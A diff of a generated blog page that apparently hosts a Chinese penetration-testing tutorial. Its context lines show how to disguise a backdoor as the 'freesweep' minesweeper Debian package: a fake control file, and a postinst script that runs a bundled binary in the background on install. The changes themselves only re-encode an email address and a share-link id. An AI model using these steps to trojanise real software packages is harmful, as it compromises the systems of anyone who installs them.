@@ -264,7 +264,7 @@
 <p>-e :编码器 可以通过命令 –list encoders 列出可用的编码器</p>
 <p>拓展生成软件包时无论是payload和软件包都要选择能够在目标操作系统上执行的</p>
 <p><strong>step 4 创建软件包信息目录</strong></p>
-<p>tee &#x2F;root&#x2F;free&#x2F;DEBIAN&#x2F;control &lt;&lt;bye<br>Package:freesweep<br>Version:1.0.1-1<br>Section:Games and Amusement<br>Priority:optional<br>Architecture:amd64<br>Maintainer:Ubuntu MOTU Developers (<a href="mailto:&#117;&#98;&#117;&#x6e;&#116;&#x75;&#x2d;&#109;&#x6f;&#116;&#117;&#x40;&#108;&#105;&#115;&#116;&#x73;&#x2e;&#x75;&#98;&#117;&#110;&#116;&#x75;&#x2e;&#99;&#x6f;&#109;">&#117;&#98;&#117;&#x6e;&#116;&#x75;&#x2d;&#109;&#x6f;&#116;&#117;&#x40;&#108;&#105;&#115;&#116;&#x73;&#x2e;&#x75;&#98;&#117;&#110;&#116;&#x75;&#x2e;&#99;&#x6f;&#109;</a>)<br>Description:a text-based minesweeper<br>freesweep is an im plementation of the popular minesweeper games,where one tries to find all the <br>mines without igniting any,based on hints given by the computer.<br>bye</p>
+<p>tee &#x2F;root&#x2F;free&#x2F;DEBIAN&#x2F;control &lt;&lt;bye<br>Package:freesweep<br>Version:1.0.1-1<br>Section:Games and Amusement<br>Priority:optional<br>Architecture:amd64<br>Maintainer:Ubuntu MOTU Developers (<a href="mailto:&#x75;&#98;&#x75;&#x6e;&#116;&#x75;&#45;&#x6d;&#x6f;&#x74;&#x75;&#x40;&#x6c;&#105;&#x73;&#x74;&#115;&#46;&#117;&#98;&#x75;&#110;&#116;&#117;&#46;&#x63;&#x6f;&#x6d;">&#x75;&#98;&#x75;&#x6e;&#116;&#x75;&#45;&#x6d;&#x6f;&#x74;&#x75;&#x40;&#x6c;&#105;&#x73;&#x74;&#115;&#46;&#117;&#98;&#x75;&#110;&#116;&#117;&#46;&#x63;&#x6f;&#x6d;</a>)<br>Description:a text-based minesweeper<br>freesweep is an im plementation of the popular minesweeper games,where one tries to find all the <br>mines without igniting any,based on hints given by the computer.<br>bye</p>
 <p><strong>step 5创建deb软件包安装脚本文件，来加载后门</strong>**</p>
 <p>tee &#x2F;root&#x2F;free&#x2F;DEBIAN&#x2F;postinst &lt;&lt;bye<br>#!&#x2F;bin&#x2F;bash<br>sudo chmod 2755 usr&#x2F;games&#x2F;freesweep_sources<br>sudo usr&#x2F;games&#x2F;freesweep_souces &amp;<br>bye</p>
 <p>ps:创建完成文件需要给文件赋权 (必须 &gt;&#x3D;0555 且 &lt;&#x3D;0775)</p>
@@ -647,7 +647,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/06/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="cl4sm8r900004ggug3d1b8dbe" data-title="" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/06/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="cl4zt2wur0005fgugf7ir7ote" data-title="" class="article-share-link">Share</a>
       
       
       
